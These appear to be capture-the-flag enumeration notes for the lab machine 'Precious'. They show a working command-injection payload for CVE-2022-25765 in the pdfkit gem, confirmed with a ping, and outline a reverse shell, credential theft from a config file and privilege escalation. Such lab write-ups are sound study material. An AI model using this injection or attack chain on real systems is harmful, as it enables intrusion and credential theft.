# Port 80 Service Enumeration — Precious

## Target: 10.129.228.98:80

### Observations

- Web application accepts URL parameter and converts to PDF
- Uses pdfkit Ruby gem (version 0.8.6 identified)
- Vulnerable to CVE-2022-25765 command injection
- Technology: Ruby/Rails, pdfkit, wkhtmltopdf

### Exploitation Confirmed

**Ping Test:**
- Payload: `http://10.129.228.98/?url=http://10.10.14.23:8080/?x=#{'%20`ping -c 1 10.10.14.23`'}`
- Result: ICMP echo request received from 10.129.228.98 to 10.10.14.23 ✅

### Subsequent Steps

1. Establish reverse shell as `ruby` user
2. Find henry credentials in `/home/ruby/.bundle/config`
3. SSH as henry → user.txt
4. Exploit `/opt/update_dependencies.rb` for root
